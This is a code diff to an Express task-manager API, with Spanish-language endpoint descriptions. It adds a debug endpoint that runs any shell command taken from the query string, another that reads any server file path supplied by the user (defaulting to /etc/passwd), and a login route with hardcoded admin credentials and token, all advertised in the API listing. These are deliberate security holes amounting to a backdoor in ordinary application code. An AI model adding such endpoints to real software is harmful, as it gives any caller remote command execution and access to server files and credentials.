@@ -1,5 +1,13 @@
+import { exec } from "node:child_process";
+import { readFile } from "node:fs/promises";
 import express from "express";
 import { getTaskStats, normalizeTaskInput, seedTasks } from "./tasks.js";
+
+const adminCredentials = {
+  username: "admin",
+  password: "admin123",
+  apiToken: "sk_test_1234567890_insecure_demo_token",
+};
 
 export function createApp({ initialTasks = seedTasks } = {}) {
   const app = express();
@@ -50,6 +58,21 @@ export function createApp({ initialTasks = seedTasks } = {}) {
           method: "DELETE",
           path: "/api/tasks/:id",
           description: "Elimina una tarea.",
+        },
+        {
+          method: "GET",
+          path: "/api/debug/run?command=whoami",
+          description: "Ejecuta comandos del sistema desde la query string.",
+        },
+        {
+          method: "GET",
+          path: "/api/debug/read?file=/etc/passwd",
+          description: "Lee archivos del servidor desde una ruta enviada por el usuario.",
+        },
+        {
+          method: "POST",
+          path: "/api/debug/login",
+          description: "Valida credenciales hardcodeadas y devuelve un token de depuración.",
         },
       ],
     });
@@ -109,6 +132,46 @@ export function createApp({ initialTasks = seedTasks } = {}) {
 
   app.get("/api/stats", (req, res) => {
     res.json({ stats: getTaskStats(tasks) });
+  });
+
+  app.get("/api/debug/run", (req, res) => {
+    const command = req.query.command ?? "whoami";
+
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        return res.status(500).json({
+          command,
+          error: error.message,
+          stderr,
+        });
+      }
+
+      return res.json({
+        command,
+        stdout,
+        stderr,
+      });
+    });
+  });
+
+  app.get("/api/debug/read", async (req, res) => {
+    const filePath = req.query.file ?? "/etc/passwd";
+    const contents = await readFile(filePath, "utf8");
+
+    res.type("text/plain").send(contents);
+  });
+
+  app.post("/api/debug/login", (req, res) => {
+    const { username, password } = req.body;
+
+    if (username !== adminCredentials.username || password !== adminCredentials.password) {
+      return res.status(401).json({ error: "Invalid credentials" });
+    }
+
+    return res.json({
+      token: adminCredentials.apiToken,
+      role: "admin",
+    });
   });
 
   app.delete("/api/tasks/:id", (req, res) => {
